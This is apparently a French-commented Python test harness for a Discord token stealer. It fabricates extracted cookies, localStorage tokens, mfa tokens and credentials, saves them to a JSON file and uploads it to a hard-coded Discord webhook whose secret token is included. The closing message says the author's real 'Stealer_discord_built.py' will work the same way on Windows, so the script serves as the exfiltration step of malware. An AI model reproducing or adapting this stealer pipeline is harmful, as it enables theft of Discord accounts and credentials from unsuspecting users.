#!/usr/bin/env python3
import json
import requests
from datetime import datetime

# Données de test pour simuler une extraction Discord
test_data = {
    "extraction_date": datetime.now().isoformat(),
    "summary": {
        "cookies": 2,
        "localStorage": 1,
        "sessionStorage": 0,
        "indexedDB": 1,
        "tokens_in_urls": 1
    },
    "data": {
        "cookies": [
            {"domain": ".discord.com", "name": "__dcfduid", "value": "test_cookie_value_123"},
            {"domain": ".discord.com", "name": "locale", "value": "fr"}
        ],
        "localStorage": [
            {"key": "token", "value": "test_discord_token_abc123"}
        ],
        "sessionStorage": [],
        "indexedDB": [
            {"database": "discord_cache", "data": "test_data"}
        ],
        "memory_tokens": [
            "mfa.test_token_456"
        ],
        "cached_credentials": []
    }
}

# Sauvegarde du fichier
with open('EXTRACTED_TEST.json', 'w', encoding='utf-8') as f:
    json.dump(test_data, f, indent=2, ensure_ascii=False)

print("✅ Fichier EXTRACTED_TEST.json créé avec des données de test")

# Test du webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1504181416899117116/gjmpRpY4nE8Ja6Uoj7p-QXNP_-PwJI2wuSfRMFCHGOVY5pzyxbov7mfkkHBnvLKDvRqE"

print("📤 Envoi vers Discord...")
try:
    with open("EXTRACTED_TEST.json", "rb") as f:
        response = requests.post(WEBHOOK_URL, files={"file": ("EXTRACTED_TEST.json", f)})

    if response.status_code == 204:
        print("✅ Test réussi ! Fichier envoyé sur Discord")
        print("📱 Vérifiez votre serveur Discord pour voir EXTRACTED_TEST.json")
    else:
        print(f"❌ Erreur webhook: {response.status_code} - {response.text}")

except Exception as e:
    print(f"❌ Erreur: {e}")

print("\n🎯 Votre vrai script Stealer_discord_built.py fonctionnera de la même façon sur Windows !")